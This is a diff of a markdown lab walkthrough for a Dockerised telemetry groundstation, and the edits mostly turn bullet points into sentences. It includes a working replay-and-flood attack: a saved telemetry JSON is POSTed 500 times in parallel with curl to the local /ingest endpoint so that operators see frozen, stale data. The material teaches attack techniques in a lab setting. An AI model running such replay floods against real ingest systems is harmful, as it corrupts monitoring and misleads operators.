@@ -186,23 +186,24 @@ cd ~/Desktop/TheDenial/groundstation
 sudo docker compose up --build
 ```
 
-- Now visit ``http://localhost:5000``
+Now visit ``http://localhost:5000``
 
 ![image](/Assets/RLab2/RLab2-9.png)
 
-- Dashboard shows live telemetry (``/stream`` SSE feed)
+The dashboard shows live telemetry (``/stream`` SSE feed).
 
-- Go to `http://localhost:5000/stream`
+Go to `http://localhost:5000/stream`
 
 ![image](/Assets/RLab2/RLab2-10.png)
 
-- Save one decoded telemetry JSON as ``stale.json``:
+Save one decoded telemetry JSON as ``stale.json``:
 
 ```bash
 echo '<JSON HERE>' > stale.json
 ```
 
-- Run the attack
+Run the attack
+
 ```bash
 seq 1 500 | xargs -I{} -P 20 sh -c \
  'curl -s -X POST http://localhost:5000/ingest \
@@ -210,7 +211,7 @@ seq 1 500 | xargs -I{} -P 20 sh -c \
    --data-binary @stale.json'
 ```
 
-- Watch the dashboard, values freeze/loop, operators see **stale data**
+Watch the dashboard. You should see values freeze/loop, and operators will see **stale data**.
 
 <hr>
 
